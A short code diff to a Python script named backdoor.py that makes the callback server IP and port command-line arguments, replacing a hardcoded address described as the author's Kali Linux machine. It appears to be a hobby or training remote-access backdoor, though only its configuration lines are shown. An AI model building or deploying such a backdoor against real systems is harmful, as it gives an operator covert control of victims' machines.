@@ -5,10 +5,18 @@ import json
 import time
 import subprocess
 import os
+import sys
+
+if len(sys.argv) != 3:
+    print("Usage: python backdoor.py <SERVER_IP> <SERVER_PORT>")
+    sys.exit()
+
+SERVER_IP = sys.argv[1]
+SERVER_PORT = int(sys.argv[2])
 
 
-SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
-SERVER_PORT = 8888
+# SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
+# SERVER_PORT = 8888
 
 
 
